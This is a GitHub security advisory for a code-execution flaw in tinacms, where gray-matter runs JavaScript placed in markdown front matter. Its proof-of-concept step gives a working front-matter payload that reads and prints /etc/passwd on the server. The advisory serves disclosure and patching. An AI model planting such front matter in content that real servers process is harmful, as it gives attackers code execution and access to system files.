# [H] tinacms is vulnerable to arbitrary code execution

## Summary
Severity: High
Advisory: GHSA-529f-9qwm-9628
CVE: CVE-2025-68278
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2025-12-18
Source: https://github.com/advisories/GHSA-529f-9qwm-9628
Type: github-advisory

## Affected
- npm: `tinacms` — affected >=0 <3.1.1
- npm: `@tinacms/cli` — affected >=0 <2.0.4
- npm: `@tinacms/graphql` — affected >=0 <2.0.3

## Details
### Summary
```tinacms``` uses the ```gray-matter``` package in an insecure way allowing attackers that can control the content of the processed markdown files, e.g., blog posts, to execute arbitrary code.

### Details
The ```gray-matter``` package executes by default the code in the markdown file's front matter. ```tinacms``` does not change this behavior when process markdown file, e.g., by passing a custom engine property for js/javascript in the options object.

### PoC
1. Create a tinacms app using the cli/documentation: 
```
npx create-tina-app@latest
```
2. Modify one of the blog posts to contain the following front matter:
```js
---js
{
  "title": "Pawned" + console.log(require("fs").readFileSync("/etc/passwd").toString())
}
---
```
3. Start the tinacms server, e.g., with ```npm run dev```
4. Observe the console of the server printing the password file, showing that attackers can execute arbitrary commands. 

### Impact
RCE: attackers can execute arbitrary JavaScript code on the server hosting tinacms.

### Feasibility
Potential attack scenarios can be executed like this: Companies often have technical writers as contractors. These contractors produce md files, which they send over email or upload in a shared cloud folder. Developers download these files and upload them in ```tinacms```'s content folder. While this example might appear speculative or contrived, a general observation is that developers would be very surprised to find out that processing untrusted markdown files via ```tinacms``` = server-side code execution = complete machine take over. That is, ```tinacms``` users might not expect markdown files to contain anything else than data and ```gray-matter``` violates that assumption.

## References
- https://github.com/tinacms/tinacms/security/advisories/GHSA-529f-9qwm-9628
- https://nvd.nist.gov/vuln/detail/CVE-2025-68278
- https://github.com/tinacms/tinacms/commit/fa7c27abef968e3f3a3e7d564f282bc566087569
- https://github.com/tinacms/tinacms
